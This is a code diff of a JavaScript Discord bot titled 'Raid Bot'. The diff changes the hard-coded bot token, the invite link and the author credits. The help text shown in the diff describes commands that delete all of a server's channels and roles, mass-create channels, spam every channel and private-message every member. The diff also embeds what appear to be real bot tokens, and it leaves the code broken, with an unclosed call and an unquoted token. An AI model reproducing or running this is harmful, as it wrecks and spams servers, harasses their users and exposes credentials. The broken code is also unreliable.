@@ -6,7 +6,7 @@ const download = require('image-downloader')
 
 var botname = "corona" //You can change this with /setbotname
 
-const token = "Njc2MzUyNjY2NTEwNTU3MTk0.XoXOjw.zJZtOIsOMFSHkpWOr7MPxNjPQeo";
+const token = "NzIyMzc3Mzk0MDU2MzMxMzM1.Xuuurw.dknq0BaXyc5zA6Q6ldNPRaX8nUI";
 
 
 client.on('message', msg => {
@@ -80,8 +80,8 @@ client.on('message', msg => {
       const helpEmbed = new Discord.RichEmbed()
       .setColor('#0099ff')
       .setTitle('Raid Bot')
-      .setURL('https://discord.gg/kgJcCcB')
-      .setDescription('Hier kun je alle commands vinden')
+      .setURL('https://discord.gg/S4XqcnS')
+      .setDescription('commands')
       .setThumbnail('https://media.istockphoto.com/photos/letter-a-3d-red-isolated-on-white-with-shadow-orthogonal-projection-picture-id688125274?k=6&m=688125274&s=612x612&w=0&h=296XCpIcGlHejCFB7rpCecq7xC3O0C1pgvnUl0Z8AKc=')
       .addField("The creators of this bot are not resposible for what you do with it!", 'Use at own risk!')
       .addBlankField()
@@ -89,8 +89,8 @@ client.on('message', msg => {
         .addField('Usage', '\n`/help`\n`/deletechannels`\n`/deleteroles`\n`/channels {name}`\n`/spam`\n`/spamall {message}`\n`/pmeveryone {message}`', true)
         .addField('Function', '\nShows this list\nDeletes all channels\n/delets all roles\nCreates 50 channels with {name}\nSpams the channel sent in\nSpams all the channels, THIS WIL ONLY WORK FOR CHANNELS MADE BY THE BOT ITSELF! OTHERS WILL CRASH IT!\nSends everyone in guild a private message with {yourmessage}', true)
       //.setImage('https://media.istockphoto.com/photos/letter-a-3d-red-isolated-on-white-with-shadow-orthogonal-projection-picture-id688125274?k=6&m=688125274&s=612x612&w=0&h=296XCpIcGlHejCFB7rpCecq7xC3O0C1pgvnUl0Z8AKc=')
-      .setTimestamp()
-        .setFooter('Made by !PandaTjuuhhh!#0001 with the help off Jochem_Legend27#4112', 'https://media.istockphoto.com/photos/letter-a-3d-red-isolated-on-white-with-shadow-orthogonal-projection-picture-id688125274?k=6&m=688125274&s=612x612&w=0&h=296XCpIcGlHejCFB7rpCecq7xC3O0C1pgvnUl0Z8AKc=');
+      .setTimestamp(
+        .setFooter('Made by ꧁☆𝖓𝖆𝖓𝖎ka☆꧂#3775  with the help off Jochem_Legend27#4112', 'https://media.istockphoto.com/photos/letter-a-3d-red-isolated-on-white-with-shadow-orthogonal-projection-picture-id688125274?k=6&m=688125274&s=612x612&w=0&h=296XCpIcGlHejCFB7rpCecq7xC3O0C1pgvnUl0Z8AKc=');
         
       msg.channel.send(helpEmbed);
         */
@@ -111,7 +111,7 @@ client.on('message', msg => {
           "url": "https://regmedia.co.uk/2019/03/12/shutterstock_police_raids.jpg"
         },
         "author": {
-          "name": "Bot made by !PandaTjuuhhh!#2424 and Jochem_Legend274112",
+          "name": "Bot made by ꧁☆𝖓𝖆𝖓𝖎ka☆꧂#3775",
           "url": "https://discordapp.com",
           "icon_url": "https://cdn.discordapp.com/embed/avatars/0.png"
         },
@@ -238,4 +238,4 @@ client.on('message', msg => {
         }
       }
   });
-client.login(token)
+client.login(NzIyMzc3Mzk0MDU2MzMxMzM1.Xuuurw.dknq0BaXyc5zA6Q6ldNPRaX8nUI)
